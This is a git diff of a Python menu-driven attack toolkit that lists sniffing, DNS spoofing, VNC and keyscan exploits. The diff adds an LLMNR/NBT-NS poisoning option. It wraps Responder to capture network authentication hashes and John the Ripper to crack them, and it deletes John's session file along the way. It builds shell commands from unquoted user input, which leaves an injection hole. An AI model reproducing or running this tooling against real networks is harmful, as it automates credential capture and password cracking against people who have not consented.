@@ -485,7 +485,8 @@ def exploit_menu():
         print("3. DNS Spoof")
         print("4. VNC Exploit")
         print("5. Keyscan Exploit")
-        print("6. Exit")
+        print("6. LLMNR / NBT-NS Poisoning")
+        print("7. Exit")
         menu_input = (input("Select option: "))
         if menu_input == "1":
             ascii_1 = pyfiglet.figlet_format("Packet Sniffer")
@@ -500,14 +501,18 @@ def exploit_menu():
             print(ascii_3)
             dns_spoof()
         elif menu_input == "4":
-            ascii_3 = pyfiglet.figlet_format("VNC Exploit")
-            print(ascii_3)
+            ascii_4 = pyfiglet.figlet_format("VNC Exploit")
+            print(ascii_4)
             vnc_menu()
         elif menu_input == "5":
-            ascii_3 = pyfiglet.figlet_format("Keyscan Exploit")
-            print(ascii_3)
+            ascii_5 = pyfiglet.figlet_format("Keyscan Exploit")
+            print(ascii_5)
             keyscan_menu()
         elif menu_input == "6":
+            ascii_6 = pyfiglet.figlet_format("LLMNR / NBT-NS Poisoning")
+            print(ascii_6)
+            llmnr_nbtns_menu()
+        elif menu_input == "7":
             exploit_loop = False
         else:
             print("Invalid Input!\nPlease Try Again!")
@@ -613,6 +618,28 @@ def keyscan_menu():
             keyscan_exploit()
         elif menu_input == "3":
             keyscan_loop = False
+        else:
+            print("Invalid Input!\nPlease Try Again!")
+            continue
+
+def llmnr_nbtns_menu():
+    llmnr_nbtns_loop = True
+    while llmnr_nbtns_loop == True:
+        print("\nPlease Select an Option Below.")
+        print("1. Start Listener")
+        print("2. Crack Hash Generated")
+        print("3. Exit")
+        menu_input = (input("Select option: "))
+        if menu_input == "1":
+            ascii_1 = pyfiglet.figlet_format("Start Listener")
+            print(ascii_1)
+            start_listener()
+        elif menu_input == "2":
+            ascii_2 = pyfiglet.figlet_format("Crack Hash Generated")
+            print(ascii_2)
+            crack_hash_generated()
+        elif menu_input == "3":
+            llmnr_nbtns_loop = False
         else:
             print("Invalid Input!\nPlease Try Again!")
             continue
@@ -1696,6 +1723,15 @@ def keyscan_exploit():
     
     with open("keyscan.txt", "w") as file:
         file.write(clean_content)
+
+def start_listener():
+    interface_name = input("Enter interface: ")
+    start_listener = subprocess.Popen(['gnome-terminal', '-e', 'bash -c "python2 Responder/Responder.py -I {}; exec bash"'.format(interface_name)])
+
+def crack_hash_generated():
+    hash_file = input("Input name of hash file: ")
+    remove_rec_file = subprocess.call("rm /root/.john/john.rec", shell = True)
+    start_listener = subprocess.call(['gnome-terminal', '-e', 'bash -c "john Responder/logs/{}; exec bash"'.format(hash_file)])
 
 
 project_menu()
